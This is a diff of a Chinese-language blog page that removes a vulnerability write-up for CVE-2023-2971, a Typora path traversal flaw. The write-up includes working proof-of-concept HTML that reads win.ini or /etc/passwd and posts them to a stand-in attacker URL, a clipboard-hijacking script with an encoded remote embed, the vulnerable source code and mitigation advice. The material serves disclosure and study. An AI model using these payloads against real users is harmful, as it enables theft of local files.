-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;typora://app/typemark#../../../../../../../../Windows/win.ini&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(r)&#125;)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="CVE-2023-2971路径遍历漏洞"><a href="#CVE-2023-2971路径遍历漏洞" class="headerlink" title="CVE-2023-2971路径遍历漏洞"></a>CVE-2023-2971路径遍历漏洞</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p> Typora for Windows/Linux &lt; 1.7.0-dev<br> 实际测试的版本：</p>
-<p>Typora for Windows 1.6.7, Typora for Linux 1.6.6 </p>
-<p> 在Windows和Linux上的1.7.0-dev之前，Typora中的不当路径处理允许构建的网页访问本地文件并通过“typora://app/typemark/”将其泄露到远程Web服务器。如果用户在 Typora 中打开恶意md文件，或从恶意网页复制文本并将其粘贴到 Typora 中，则可利用此漏洞。 </p>
-<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><h4 id="利用方式1，打开恶意markdown文件"><a href="#利用方式1，打开恶意markdown文件" class="headerlink" title="利用方式1，打开恶意markdown文件"></a>利用方式1，打开恶意markdown文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Typora 1.6.7 Local File Disclosure Proof-of-Concept&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre id=&quot;log&quot; style=&quot;background: #eee; width: 100%;&quot;&gt;&lt;/pre&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    const log = t =&gt; &#123;</span><br><span class="line">        document.getElementById(&quot;log&quot;).textContent += t + &#x27;\r\n&#x27;;</span><br><span class="line">        fetch(&#x27;//example.localtest.me/send-file-to-attacker-server&#x27;, &#123;mode: &#x27;no-cors&#x27;, body: t, method: &#x27;POST&#x27;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    log(&#x27;location.origin: &#x27; + location.origin)</span><br><span class="line">    log(&#x27;navigator.platform: &#x27; + navigator.platform)</span><br><span class="line">    log(&#x27; &#x27;)</span><br><span class="line">    if(navigator.platform === &#x27;Win32&#x27;)&#123;</span><br><span class="line">        log(&#x27;Content of your C:\\Windows\\win.ini:&#x27;)</span><br><span class="line">        fetch(&#x27;typora://app/typemark/%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows/win.ini&#x27;).then(r=&gt;r.text()).then(r=&gt;&#123;log(r)&#125;)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        log(&#x27;Content of your /etc/passwd:&#x27;)</span><br><span class="line">        fetch(&#x27;typora://app/typemark#/../../../../../../../../etc/passwd&#x27;).then(r=&gt;r.text()).then(r=&gt;&#123;log(r)&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>将上面的HTML文件另存为 <code>poc1.html</code> 并将其存放到Web服务器，然后将此行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;http(s)://YOUR-WEB-SERVER/poc1.html&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>附加到任何markdown文件中。</p>
-<p>在poc执行后，</p>
-<ol>
-<li>尝试在Windows或 <code>/etc/passwd</code> Linux上阅读 <code>C:/Windows/win.ini</code> ，</li>
-<li>在网页中显示文件的内容，</li>
-<li>将文件发送到外部 URL <code>example.localtest.me</code> （此域解析为 127.0.0.1 仅用于演示目的）。</li>
-</ol>
-<h4 id="利用方式2-编辑网页上的copy事件"><a href="#利用方式2-编辑网页上的copy事件" class="headerlink" title="利用方式2 编辑网页上的copy事件"></a>利用方式2 编辑网页上的copy事件</h4><p> 攻击者可以手工创建恶意网页，并使用以下代码挂接 <code>copy</code> 事件： </p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;copy&#x27;</span>,<span class="function"><span class="params">e</span>=&gt;</span>&#123;</span><br><span class="line">        e.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="comment">//&amp;#x3c;embed style=&quot;height:0;&quot; src=&quot;https://o.cal1.cn/cab3e723540d9948-typora-167-poc/local-file-disclosure.html&quot;&gt;&amp;#x0d;&amp;#x0d;</span></span><br><span class="line">        <span class="keyword">let</span> payload = <span class="title function_">atob</span>(<span class="string">&#x27;JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJodHRwczovL28uY2FsMS5jbi9jYWIzZTcyMzU0MGQ5OTQ4LXR5cG9yYS0xNjctcG9jL2xvY2FsLWZpbGUtZGlzY2xvc3VyZS5odG1sIj4mI3gwZDsmI3gwZDs=&#x27;</span>);</span><br><span class="line">        e.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&#x27;text/markhtml&#x27;</span>, <span class="string">`\x20\x0d\x0a\x0d\x0a`</span> + payload + <span class="variable language_">window</span>.<span class="title function_">getSelection</span>());</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(payload + <span class="variable language_">window</span>.<span class="title function_">getSelection</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p> 当受害者从此页面复制文本时，有效负载将添加到复制的内容中，并在粘贴到 Typora 时触发。 </p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;embed style=&quot;height:0;&quot; src=&quot;https://o.cal1.cn/cab3e723540d9948-typora-167-poc/local-file-disclosure.html&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>相当于在Typora中内嵌了上面的内容</p>
-<p><img src="/categories/CTF/CVE-2023-2317/CVE-2023-2971_03.Copy-and-Paste.gif" alt></p>
-<h3 id="2971漏洞原理"><a href="#2971漏洞原理" class="headerlink" title="2971漏洞原理"></a>2971漏洞原理</h3><blockquote>
-<p>为了在Typora编辑器中加载本地资源，在 <code>resources/app.asar/atom.js</code>, 自定义了URL模式<code>typora://</code>，通过<code>electron.protocol.registerFileProtocol</code> API注册.  </p>
-<p>处理 <code>typora://</code>的代码片段如下 : </p>
-</blockquote>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">m.<span class="title function_">registerFileProtocol</span>(e, <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    e.<span class="property">url</span> ? <span class="title function_">t</span>(&#123;</span><br><span class="line">        <span class="attr">path</span>: c.<span class="title function_">getRealPath</span>(e.<span class="property">url</span>)</span><br><span class="line">    &#125;) : <span class="title function_">t</span>(&#123;</span><br><span class="line">        <span class="attr">error</span>: -<span class="number">324</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;),</span><br><span class="line"></span><br><span class="line">c.<span class="property">getRealPath</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        e = <span class="built_in">decodeURI</span>(e)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    e = e.<span class="title function_">substr</span>(<span class="number">13</span>);<span class="comment">//截取到模式选项</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^userData/i</span>.<span class="title function_">exec</span>(e))</span><br><span class="line">        e = e.<span class="title function_">replace</span>(<span class="regexp">/^userData/</span>, c.<span class="title function_">getPath</span>(<span class="string">&quot;userData&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>));</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/^typemark/i</span>.<span class="title function_">exec</span>(e))      <span class="comment">// [1]</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;reject access to path&quot;</span>, e),</span><br><span class="line">            <span class="string">&quot;&quot;</span>;</span><br><span class="line">        e = e.<span class="title function_">replace</span>(<span class="regexp">/^typemark/</span>, t)       <span class="comment">// [2]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/current-theme\.css$/</span>.<span class="title function_">exec</span>(e) &amp;&amp; (e = e.<span class="title function_">replace</span>(<span class="regexp">/current-theme\.css$/</span>, c.<span class="property">setting</span>.<span class="title function_">curTheme</span>())),</span><br><span class="line">    e = (e = <span class="regexp">/preview\.html/</span>.<span class="title function_">exec</span>(e) ? e.<span class="title function_">replace</span>(<span class="regexp">/\.html[?#].*$/</span>, <span class="string">&quot;.html&quot;</span>) : e).<span class="title function_">replace</span>(<span class="regexp">/[?#][^\\\/]*$/</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p> 例如，当主窗口尝试加载 <code>typora://app/typemark/window.html</code> 时，URL 将从 转换 <code>[Typora Installation Absolute Path]/resources/window.html</code> 和加载。 </p>
-<h2 id="漏洞缓解和漏洞建议"><a href="#漏洞缓解和漏洞建议" class="headerlink" title="漏洞缓解和漏洞建议"></a>漏洞缓解和漏洞建议</h2><p> 对于使用受此漏洞影响的版本的最终用户，建议 （1） 不应在 Typora 中打开任何不受信任的 markdown 文件，以及 （2） 应避免从不受信任的网页复制文本然后将其粘贴到 Typora 中。 </p>
-<p> 禁止 http 网页访问 <code>typora://</code> 资源。 如在浏览器和Typora0.9版本中规定的那样。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1187,7 +1134,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">181</span>
+          <span class="site-state-item-count">182</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
